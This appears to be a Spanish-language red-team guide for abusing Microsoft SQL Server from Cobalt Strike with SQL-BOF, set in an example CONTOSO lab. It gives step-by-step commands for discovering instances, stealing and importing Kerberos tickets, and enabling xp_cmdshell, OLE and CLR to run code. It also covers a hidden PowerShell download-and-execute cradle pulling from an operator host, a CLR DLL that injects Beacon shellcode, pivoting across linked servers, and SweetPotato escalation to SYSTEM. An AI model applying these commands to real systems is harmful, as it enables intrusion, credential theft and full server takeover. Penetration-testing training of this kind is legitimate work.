---
title: "MSSQL Abuse Cobalt Strike"
description: "
Guía práctica para descubrir instancias de Microsoft SQL Server, enumerar permisos, ejecutar código, acceder a servidores enlazados y escalar privilegios locales desde Cobalt Strike con SQL-BOF. Cada fase combina conceptos esenciales con comandos comentados.
Los ejemplos utilizan el dominio `CONTOSO`, las instancias `lon-db-1` y `lon-db-2`, y el usuario `rsteel`." 
category: "Databases"
tools: ["MSSQL", "Cobalt Strike"]
updated: 2026-11-02
tags: ["mssql", "sql", "ad"]
draft: false
--- 

>[SQL-BOF](https://github.com/Tw1sm/SQL-BOF)

## 1. Conceptos que no hay que confundir

| Concepto                 | Qué controla                                                                            |
| ------------------------ | --------------------------------------------------------------------------------------- |
| Login SQL                | Identidad que se autentica en la instancia, mediante Windows o autenticación SQL        |
| Usuario de base de datos | Identidad dentro de una base de datos; puede estar mapeada a un login                   |
| `public`                 | Rol básico; no implica privilegios administrativos                                      |
| `db_owner`               | Control de una base de datos; no equivale automáticamente a `sysadmin`                  |
| `sysadmin`               | Control de la instancia SQL; no implica pertenecer a Administrators en Windows          |
| Cuenta del servicio SQL  | Identidad Windows bajo la que corre `sqlservr.exe` y el código ejecutado en su contexto |
| `NT AUTHORITY\SYSTEM`    | Identidad Windows obtenida tras la escalada local del ejemplo                           |

**Flujo de explotación:** acceso inicial → identidad SQL con `sysadmin` → ejecución como servicio SQL → enlace a otra instancia → ejecución allí → escalada local a SYSTEM.

## 2. Preparación y descubrimiento

Cargar `C:\Tools\SQL-BOF\SQL\SQL.cna` desde **Cobalt Strike → Script Manager**. Los comandos `sql-*` de esta guía pertenecen a SQL-BOF; deben estar cargados antes de ejecutarlos desde Beacon.

Los SPN `MSSQLSvc` permiten localizar servicios registrados para Kerberos. El siguiente filtro busca cuentas de usuario: no es un inventario exhaustivo de todas las instancias. El puerto TCP habitual es `1433`, pero una instancia puede usar otro.

```shell
# Buscar cuentas de usuario con SPN de SQL Server
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
# Ejemplo de resultado: mssql_svc y MSSQLSvc/lon-db-1.contoso.com:1433

# Complementar el descubrimiento buscando TCP/1433 en la red objetivo
portscan 10.10.120.0/23 1433 arp 1024
# Esperado: 10.10.120.20:1433 si el puerto es accesible

# Consultar SQL Browser por UDP/1434, si está disponible
sql-1434udp 10.10.120.20
# Esperado: servidor, instancia, versión y puerto anunciado
```

Que SQL Browser no responda o no aparezca un SPN no demuestra que no exista SQL Server.

## 3. Información, identidad y datos

`sql-info` resume la instancia; `sql-whoami` consulta la identidad y los roles efectivos. La información visible depende de los permisos. Comprobar el contexto cada vez que se cambie de token o de servidor.

```shell
# Datos de la instancia y contexto de conexión
sql-info lon-db-1
# Revisar: CurrentLogin, IsSysAdmin, ServiceAccount, versión y arquitectura

# Roles efectivos en SQL
sql-whoami lon-db-1
# Comprobar si el login pertenece a sysadmin

# Confirmar qué instancia responde
sql-query lon-db-1 "SELECT @@SERVERNAME"
# Esperado: nombre de lon-db-1

# Listar bases de datos accesibles o visibles
sql-databases lon-db-1
# Esperado: listado condicionado por los permisos del login
```

Para explorar datos, utilizar los siguientes comandos y consultar su ayuda para los argumentos de la versión instalada:

| Comando | Uso |
|---|---|
| `sql-tables` | Tablas de una base de datos |
| `sql-columns` | Columnas de una tabla |
| `sql-search` | Columnas cuyo nombre contiene una palabra clave |

### Acceso con una identidad privilegiada

Un login con permisos limitados puede no permitir continuar hacia la ejecución de código. Si se dispone de una identidad con mayores permisos, es necesario comprobar su acceso efectivo a la instancia. En este ejemplo, `rsteel` pertenece a `Database Admins`; el nombre del grupo no garantiza ningún rol SQL por sí solo.

```shell
# Consultar miembros directos del grupo de administración SQL del ejemplo
ldapsearch (&(objectClass=group)(cn=Database Admins)) --attributes member,distinguishedName
# Esperado: Robert Steel entre los miembros; no expande grupos anidados

# Desde un Beacon SYSTEM: extraer el TGT disponible de rsteel
krb_dump /user:rsteel /service:krbtgt
# Esperado: material del ticket si existe y el contexto permite extraerlo

# Tras guardar el ticket como rsteel.kirbi, preparar el contexto de red
make_token CONTOSO\rsteel FakePass
kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi

# Verificar el resultado real en SQL
sql-info lon-db-1
sql-whoami lon-db-1
# Esperado: CONTOSO\rsteel y sysadmin
```

`FakePass` es el marcador del ejemplo con ticket importado: no es una contraseña válida descubierta. Crear ese contexto no demuestra por sí solo que se pueda autenticar; la comprobación es la conexión efectiva. El acceso SQL tampoco demuestra que `rsteel` sea administrador local de Windows.

## 4. Ejecución desde SQL Server

El siguiente flujo utiliza **`sysadmin`** para habilitar funcionalidades y ejecutar código. Consultar primero el estado: `value_in_use = 0` significa deshabilitado y `1`, habilitado. Anotar el valor inicial antes de cambiarlo.

| Técnica | Mecanismo | Salida en el ejemplo |
|---|---|---|
| `xp_cmdshell` | Comando del sistema operativo | Devuelve filas de texto |
| OLE Automation | Objetos COM, como `WScript.Shell` | `sql-olecmd` no devuelve stdout |
| SQL CLR | Procedimiento de un ensamblado .NET | El ejemplo comprueba el Beacon resultante |

### xp_cmdshell

Ejecuta comandos y devuelve su salida. En este flujo con `sysadmin`, se usa la identidad Windows del servicio SQL.

```shell
# Consultar y anotar el estado inicial
sql-query lon-db-1 "SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell'"
# Esperado: 0 o 1

# Habilitar únicamente si era necesario
sql-enablexp lon-db-1

# Comprobar equipo e identidad de ejecución
sql-xpcmd lon-db-1 "hostname && whoami"
# Esperado: nombre del servidor y cuenta del servicio SQL, no necesariamente SYSTEM

# Restaurar a 0 únicamente si originalmente estaba deshabilitado
sql-disablexp lon-db-1
```

Equivalente dentro de una sesión SQL:

```sql
EXEC xp_cmdshell 'hostname && whoami';
```

La cadena de `xp_cmdshell` admite como máximo un par de comillas dobles; revisar especialmente las rutas con espacios.

### OLE Automation

Permite crear y manipular objetos COM. `sp_OACreate` crea el objeto, `sp_OAMethod` invoca métodos y `sp_OADestroy` lo destruye. También existen operaciones para propiedades, errores y parada del entorno OLE.

```shell
# Consultar y anotar el estado inicial
sql-query lon-db-1 "SELECT value_in_use FROM sys.configurations WHERE name = 'Ole Automation Procedures'"

# Habilitar si estaba desactivado
sql-enableole lon-db-1

# Ejecutar mediante WScript.Shell
sql-olecmd lon-db-1 "cmd /c calc"
# Esperado: mensaje de ejecución del BOF, sin salida del comando
# Una aplicación gráfica de un servicio puede no aparecer en tu escritorio

# Restaurar solo si originalmente estaba desactivado
sql-disableole lon-db-1
```

OLE también permite iniciar una descarga y ejecución mediante PowerShell. Primero se prepara el comando en **PowerShell del operador**:

```powershell
# URL del recurso alojado por el operador y accesible desde el servidor SQL
$cmd = 'iex (new-object net.webclient).downloadstring("http://lon-wkstn-1:8080/b")'
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
# Esperado: comando codificado en Base64 UTF-16LE
```

Después, con OLE habilitado, en **Beacon**:

```shell
# Sustituir el marcador por el resultado anterior
sql-olecmd lon-db-1 "cmd /c powershell -w hidden -nop -enc <BASE64>"
# Revisar el registro web: una petición GET /b confirma la descarga, no toda la ejecución

# Si el recurso inicia un SMB Beacon, conectar a su pipe
link lon-db-1 <PIPE_SMB>
# Esperado: established link to child beacon
```

Si SQL no tiene salida directa al servidor web, se puede utilizar un **reverse port forward** mediante un equipo accesible. La URL del ejemplo presupone ese acceso o reenvío ya preparado; revisar conectividad y firewall si no aparece la petición. Restaurar OLE al terminar.

### SQL CLR

Integra .NET en SQL Server. El procedimiento del ejemplo es un método público y estático marcado con `[SqlProcedure]`. El BOF descrito registra el hash SHA-512 como ensamblado de confianza, crea ensamblado y procedimiento, ejecuta y limpia sus objetos temporales.

```shell
# Consultar y anotar el estado inicial
sql-query lon-db-1 "SELECT value_in_use FROM sys.configurations WHERE name = 'clr enabled'"

# Habilitar si estaba desactivado
sql-enableclr lon-db-1

# Cargar la DLL local del operador e invocar el procedimiento
sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
# Esperado: carga y ejecución sin errores; verificar el efecto del procedimiento

# Restaurar solo si originalmente estaba desactivado
sql-disableclr lon-db-1
```

**Preparación de una DLL con un procedimiento que ejecuta un SMB Beacon:** generar un Windows Stageless Payload con listener `smb`, arquitectura x64, formato `Raw` y Exit Function `Thread`. Guardarlo como `smb_x64.xthread.bin`, incluirlo como recurso incrustado en una **Class Library (.NET Framework)** y compilar el procedimiento `MyProcedure`.

La implementación del procedimiento debe leer `MyProcedure.smb_x64.xthread.bin`, reservar memoria, copiar el contenido y crear un hilo en el propio proceso SQL. El nombre del recurso debe coincidir con el namespace y el archivo incrustado. Esta ejecución adopta la cuenta del servicio; no concede SYSTEM por sí sola.

```shell
# Conectar al SMB Beacon creado por el procedimiento
link lon-db-1 <PIPE_SMB>
# Esperado: established link to child beacon

# En el Beacon hijo, confirmar la identidad obtenida
getuid
# Esperado: cuenta del servicio SQL de lon-db-1
```

El `link` requiere conectividad SMB y autenticación válida: por ejemplo, un TGT utilizable para obtener el ticket CIFS o un ticket CIFS apropiado ya importado. El nombre de la pipe procede del listener SMB. Un fallo de `link` no prueba por sí solo que CLR haya fallado.

## 5. Linked servers: lon-db-1 → lon-db-2

Un linked server permite acceder a otra fuente de datos desde la instancia inicial. **El contexto remoto depende del mapeo del enlace**: credenciales fijas o contexto de la sesión, sujeto a la configuración de autenticación. Puede tener más o menos privilegios que el login del origen.

```shell
# Enumerar enlaces de la instancia inicial
sql-links lon-db-1
# Ejemplo de resultado: LON-DB-2

# Confirmar el destino de la consulta
sql-query lon-db-1 "SELECT @@SERVERNAME" "" lon-db-2
# Esperado: nombre de lon-db-2

# Consultar los permisos efectivos en el destino
sql-whoami lon-db-1 "" lon-db-2
# Ejemplo de resultado: sysadmin en lon-db-2
```

Conservar el argumento vacío `""`: mantiene el servidor enlazado en la posición correcta de los comandos mostrados.

### RPC Out y CLR remoto

**RPC Out** permite invocar procedimientos remotos por el enlace; poder consultar datos no implica poder realizar esas llamadas. Cambiar esta opción requiere permisos en **lon-db-1**, mientras que habilitar CLR remoto requiere permisos en **lon-db-2**.

```shell
# Consultar y anotar RPC Out del enlace en el origen
sql-checkrpc lon-db-1
# Esperado: fila de LON-DB-2 con 0 o 1

# Habilitar únicamente si estaba desactivado
sql-enablerpc lon-db-1 lon-db-2

# Consultar y anotar el estado de CLR en el destino
sql-query lon-db-1 "SELECT value_in_use FROM sys.configurations WHERE name = 'clr enabled'" "" lon-db-2

# Habilitar CLR remoto si es necesario
sql-enableclr lon-db-1 "" lon-db-2

# Ejecutar el procedimiento en lon-db-2 a través de lon-db-1
sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure "" lon-db-2
# Esperado: ejecución en lon-db-2

# Conectar al SMB Beacon del segundo servidor
link lon-db-2 <PIPE_SMB>
# Esperado: nuevo Beacon; comprobar getuid en él
```

El enlace transporta la operación SQL. La conexión posterior de `link` necesita su propia conectividad y autenticación SMB hacia `lon-db-2`.

Restaurar **primero CLR remoto y después RPC Out**, si ambos estaban desactivados al comenzar:

```shell
# Ejecutar desde el contexto con acceso SQL al origen
sql-disableclr lon-db-1 "" lon-db-2

# Restaurar la opción del enlace en lon-db-1
sql-query lon-db-1 "EXEC master.dbo.sp_serveroption @server=N'lon-db-2', @optname=N'rpc out', @optvalue=N'false';"

# Comprobar el estado final
sql-checkrpc lon-db-1
# Esperado: LON-DB-2 vuelve a 0 si ese era su valor inicial
```

## 6. Escalada local: servicio SQL → SYSTEM

En `lon-db-2`, la cuenta del ejemplo es `NT Service\MSSQLSERVER`. Es una cuenta virtual de servicio y no es administradora local por defecto; puede usar la identidad del equipo para acceder a la red.

Su token puede incluir **`SeImpersonatePrivilege`**, que permite suplantar a un cliente tras autenticarse. La presencia de este privilegio no garantiza que una técnica concreta funcione; un privilegio deshabilitado tampoco equivale a uno ausente.

```shell
# Ejecutar en el Beacon del servicio SQL de lon-db-2
getuid
# Esperado: NT Service\MSSQLSERVER

# Consultar privilegios del token
shell whoami /priv
# Buscar: SeImpersonatePrivilege y su estado
```

SweetPotato permite intentar la creación de otro proceso con un token SYSTEM aprovechando un contexto de suplantación compatible. Preparar previamente un Windows Stageless Payload con el listener `tcp-local`, guardado en el operador como `C:\Payloads\tcp-local_x64.exe`. El ejemplo presupone escucha local en TCP `1337`.

```shell
# Seleccionar el directorio remoto del ejemplo; debe existir y ser escribible
cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps

# Subir el payload desde el operador al directorio remoto actual
upload C:\Payloads\tcp-local_x64.exe

# SweetPotato.exe es local al operador; la ruta de -p está en lon-db-2
execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
# Esperado: obtención del token y creación del proceso si la técnica funciona

# Desde el Beacon original de lon-db-2, conectar al proceso nuevo
connect localhost 1337
# Esperado: established link to child beacon

# Cambiar al Beacon hijo y confirmar la elevación
getuid
# Esperado: NT AUTHORITY\SYSTEM
```

**SweetPotato eleva; `connect` solo conecta.** `localhost` se refiere a `lon-db-2`, donde se ejecuta el Beacon que lanza el comando. El Beacon original conserva su identidad.

## 7. Diagnóstico rápido

| Síntoma                                       | Qué revisar                                                                   |
| --------------------------------------------- | ----------------------------------------------------------------------------- |
| No aparecen SPN                               | Alcance del filtro LDAP; complementar con descubrimiento de puertos           |
| SQL Browser no responde                       | Servicio, UDP/1434 y firewall; probar el endpoint SQL conocido                |
| Login fallido o contexto inesperado           | Token/ticket activo, identidad y permisos de acceso SQL                       |
| `sql-info` muestra datos parciales            | Permisos del login; comprobar `sql-whoami`                                    |
| No se puede habilitar una función             | Permisos efectivos y servidor al que se está aplicando el cambio              |
| Consulta por enlace funciona, ejecución falla | RPC Out y permisos diferentes en origen y destino                             |
| `sql-clr` falla                               | Ruta local, nombre exacto del procedimiento, CLR, confianza y errores del BOF |
| OLE no muestra salida                         | El BOF no devuelve stdout; comprobar efectos y registros                      |
| No aparece la descarga web                    | URL, recurso servido, conectividad, reenvío y firewall                        |
| `link` falla                                  | Pipe del listener, proceso activo, acceso SMB y ticket CIFS/TGT               |
| `connect localhost 1337` falla                | Beacon padre en el host correcto, payload iniciado y puerto del listener      |
| El Beacon sigue siendo cuenta de servicio     | Comprobar identidad en el hijo; el padre no cambia al crear otro proceso      |

## 8. Limpieza y comprobación final

Deshabilitar únicamente las opciones que se hayan habilitado durante la ejecución. Si ya estaban activas, conservar su estado original.

```shell
# Restaurar las funcionalidades utilizadas en la instancia inicial
sql-disablexp lon-db-1
sql-disableole lon-db-1
sql-disableclr lon-db-1

# Restaurar CLR en el servidor enlazado antes de desactivar RPC Out
sql-disableclr lon-db-1 "" lon-db-2

# Desactivar RPC Out del enlace
sql-disablerpc lon-db-1 lon-db-2

# Comprobar el estado final de RPC Out
sql-checkrpc lon-db-1
# Esperado: LON-DB-2 = 0 si originalmente estaba desactivado
```

## 9. Checklist rápida

Recorrido por fases para consultar durante la enumeración y explotación. Sustituir los marcadores `<...>` antes de ejecutar los comandos. Las vías de ejecución son alternativas: elegir la adecuada y comprobar sus requisitos.

```text
PREPARACIÓN Y DESCUBRIMIENTO
[ ] Cargar SQL.cna en Cobalt Strike → Script Manager
[ ] Buscar SPN: ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
[ ] Anotar hosts, cuentas de servicio e instancias descubiertas
[ ] Complementar con puertos: portscan <RED/CIDR> 1433 arp 1024
[ ] Si SQL Browser responde: sql-1434udp <IP>
[ ] Confirmar el puerto real de la instancia; no asumir siempre 1433

IDENTIDAD Y PERMISOS SQL
[ ] sql-info <SQL1>                         → login, cuenta de servicio, versión y arquitectura
[ ] sql-whoami <SQL1>                       → comprobar roles efectivos y sysadmin
[ ] sql-query <SQL1> "SELECT @@SERVERNAME"   → confirmar la instancia
[ ] sql-databases <SQL1>                    → bases de datos visibles
[ ] Enumerar tablas, columnas y nombres de interés según los permisos disponibles
[ ] Si se dispone de otra identidad de dominio, comprobar su acceso efectivo a SQL
[ ] Si se usa un TGT: make_token <DOMINIO>\<USUARIO> FakePass
[ ] Importar el ticket: kerberos_ticket_use C:\ruta\usuario.kirbi
[ ] Repetir sql-info y sql-whoami tras cambiar de identidad
[ ] Distinguir sysadmin en SQL de administrador local en Windows

EJECUCIÓN — ELEGIR UNA VÍA
[ ] Consultar y anotar el valor inicial de la función elegida en sys.configurations
[ ] xp_cmdshell:
    [ ] sql-enablexp <SQL1>                 → solo si estaba deshabilitado
    [ ] sql-xpcmd <SQL1> "hostname && whoami"
    [ ] Confirmar host y cuenta Windows en la salida
[ ] OLE Automation:
    [ ] sql-enableole <SQL1>                → solo si estaba deshabilitado
    [ ] sql-olecmd <SQL1> "<COMANDO>"
    [ ] Verificar el efecto; este BOF no devuelve stdout
    [ ] Si hay descarga web, comprobar URL, conectividad y petición al servidor
[ ] SQL CLR:
    [ ] Preparar una DLL compatible y confirmar el nombre del procedimiento
    [ ] sql-enableclr <SQL1>                → solo si estaba deshabilitado
    [ ] sql-clr <SQL1> C:\ruta\MyProcedure.dll MyProcedure
    [ ] Verificar la ejecución y la limpieza de los objetos temporales

CONEXIÓN AL SMB BEACON
[ ] Confirmar pipe del listener, conectividad SMB y autenticación al destino
[ ] link <SQL1> <PIPE_SMB>
[ ] En el Beacon hijo: getuid               → confirmar la cuenta del servicio
[ ] Si falla link, revisar SMB y tickets antes de concluir que falló la ejecución

LINKED SERVERS
[ ] sql-links <SQL1>                        → identificar enlaces disponibles
[ ] sql-query <SQL1> "SELECT @@SERVERNAME" "" <SQL2>
[ ] sql-whoami <SQL1> "" <SQL2>             → comprobar privilegios en el destino
[ ] sql-checkrpc <SQL1>                     → anotar RPC Out del enlace elegido
[ ] sql-enablerpc <SQL1> <SQL2>             → si hace falta y hay permisos en el origen
[ ] Consultar y anotar CLR en SQL2 mediante sql-query con los argumentos "" <SQL2>
[ ] sql-enableclr <SQL1> "" <SQL2>          → si hace falta y hay permisos en el destino
[ ] sql-clr <SQL1> C:\ruta\MyProcedure.dll MyProcedure "" <SQL2>
[ ] link <SQL2> <PIPE_SMB>                  → requiere acceso SMB propio hacia SQL2
[ ] En el nuevo Beacon: getuid

ESCALADA LOCAL DESDE EL SERVICIO SQL
[ ] getuid                                  → identificar la cuenta Windows actual
[ ] shell whoami /priv                      → buscar SeImpersonatePrivilege
[ ] Comprobar que el contexto permite la técnica elegida; el privilegio solo no basta
[ ] Preparar el payload tcp-local y confirmar su puerto de escucha
[ ] Subir el ejecutable a un directorio existente y escribible del servidor
[ ] execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "<RUTA_REMOTA_EXE>"
[ ] Revisar si se obtuvo el token y se creó el proceso
[ ] Desde el Beacon del mismo servidor: connect localhost 1337
[ ] En el Beacon hijo: getuid               → verificar NT AUTHORITY\SYSTEM

RESTAURACIÓN Y CIERRE
[ ] Ejecutar las desactivaciones solo si las opciones estaban deshabilitadas al inicio
[ ] sql-disablexp <SQL1>                    → restaurar xp_cmdshell
[ ] sql-disableole <SQL1>                   → restaurar OLE Automation
[ ] sql-disableclr <SQL1>                   → restaurar CLR local
[ ] sql-disableclr <SQL1> "" <SQL2>        → restaurar CLR remoto antes de RPC Out
[ ] sql-disablerpc <SQL1> <SQL2>            → restaurar RPC Out del enlace
[ ] sql-checkrpc <SQL1>                     → comprobar que el enlace vuelve a su estado inicial
```